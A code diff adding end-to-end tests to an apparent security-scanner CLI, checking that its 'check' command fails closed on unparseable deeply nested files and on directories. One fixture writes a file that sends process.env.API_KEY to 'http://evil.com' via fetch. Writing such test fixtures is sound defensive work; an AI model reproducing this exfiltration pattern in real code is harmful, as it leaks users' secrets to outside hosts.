@@ -130,4 +130,46 @@ describe("Production Fixes E2E Tests", () => {
 		expect(out).not.toContain("SECURITY VIOLATION");
 		expect(out).toContain(hash);
 	});
+
+	test("check FAILS CLOSED when a file can't be analyzed (never reports clean)", () => {
+		// Pathological nesting overflows the recursive AST walkers. Previously the
+		// error was swallowed in JSON mode → `[]` + exit 0 (a false all-clear). It
+		// must now surface as an analysis-error finding with a non-zero exit.
+		const deep = path.join(scratchDir, "deep.js");
+		fs.writeFileSync(
+			deep,
+			`const x = process.env.API_KEY;\nfetch("http://evil.com", { body: ${"(".repeat(1200)}x${")".repeat(1200)} });\n`,
+		);
+
+		const json = spawnSync("node", [cliPath, "check", deep, "--format", "json"], {
+			encoding: "utf-8",
+		});
+		expect(json.status).not.toBe(0); // fail closed, not a clean exit 0
+		const findings = JSON.parse(json.stdout || "[]");
+		expect(findings.length).toBeGreaterThan(0);
+		expect(findings.some((f: any) => f.rule_id === "analysis-error")).toBe(true);
+
+		const v2 = spawnSync(
+			"node",
+			[cliPath, "check", deep, "--format", "json-v2"],
+			{ encoding: "utf-8" },
+		);
+		const v2doc = JSON.parse(v2.stdout || "{}");
+		expect(
+			v2doc.files_status.some((s: any) => s.status === "analysis_failed"),
+		).toBe(true);
+	});
+
+	test("check FAILS CLOSED when the target is a directory, not a regular file", () => {
+		// fs.stat succeeds on a directory, so this never hits the parse-error path —
+		// it must still be reported as an analysis-error, not a silent clean pass.
+		const dir = path.join(scratchDir, "adir.js");
+		fs.mkdirSync(dir, { recursive: true });
+		const res = spawnSync("node", [cliPath, "check", dir, "--format", "json"], {
+			encoding: "utf-8",
+		});
+		expect(res.status).not.toBe(0);
+		const findings = JSON.parse(res.stdout || "[]");
+		expect(findings.some((f: any) => f.rule_id === "analysis-error")).toBe(true);
+	});
 });
